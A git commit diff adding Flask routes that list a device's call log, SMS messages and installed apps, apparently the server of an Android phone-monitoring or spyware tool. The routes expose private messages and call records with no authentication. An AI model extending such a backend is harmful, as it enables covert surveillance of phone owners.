77c2ec4c90cebd9915b6e99ab3965c7f4c980137
guptaautkarsh <utkarshgupta3125@gmail.com>
2025-04-06 03:13:56 +0530

    completed routes to show data

--- hack/routes.py
+++ hack/routes.py
@@ -97,3 +97,67 @@ def store_installed_apps(device_id):
 
     else:
         return jsonify({"error": "Request must be JSON"})
+
+
+@app.route('/show_call_log/<int:device_id>')
+def show_call_log(device_id):
+    json_arr = []
+
+    call_logs = CallLog.query.filter_by(device_id=device_id).order_by(CallLog.timestamp.desc())
+    if not call_logs:
+        return jsonify({"message": "Android app is not installed yet"})
+
+    for log in call_logs:
+        obj = {
+            "id": log.id,
+            "device_id": log.device_id,
+            "phone_number": log.phone_number,
+            "call_type": log.call_type,
+            "timestamp": log.timestamp.strftime("%Y-%m-%d %H:%M:%S") if log.timestamp else None,
+            "duration_seconds": log.duration_seconds
+        }
+        json_arr.append(obj)
+
+    return jsonify({'call_log': json_arr})
+
+
+@app.route('/show_sms/<int:device_id>')
+def show_sms(device_id):
+    json_arr = []
+
+    sms_data = SMS.query.filter_by(device_id=device_id).order_by(SMS.timestamp.desc())
+    if not sms_data:
+        return jsonify({"message": "Android app is not installed yet"})
+
+    for sms in sms_data:
+        obj = {
+            "id": sms.id,
+            "device_id": sms.device_id,
+            "sender": sms.sender,
+            "message_body": sms.message_body,
+            "timestamp": sms.timestamp.strftime("%Y-%m-%d %H:%M:%S") if sms.timestamp else None,
+            "message_type": sms.message_type
+        }
+        json_arr.append(obj)
+
+    return jsonify({'sms_data': json_arr})
+
+
+@app.route('/show_app_installed/<int:device_id>')
+def show_app_installed(device_id):
+    json_arr = []
+
+    app_data = AppInstalled.query.filter_by(device_id=device_id).order_by(AppInstalled.app_name.asc())
+    if not app_data:
+        return jsonify({"message": "Android app is not installed yet"})
+
+    for a in app_data:
+        obj = {
+            "id": a.id,
+            "device_id": a.device_id,
+            "app_name": a.app_name,
+            "app_package": a.app_package
+        }
+        json_arr.append(obj)
+
+    return jsonify({'app_data': json_arr})
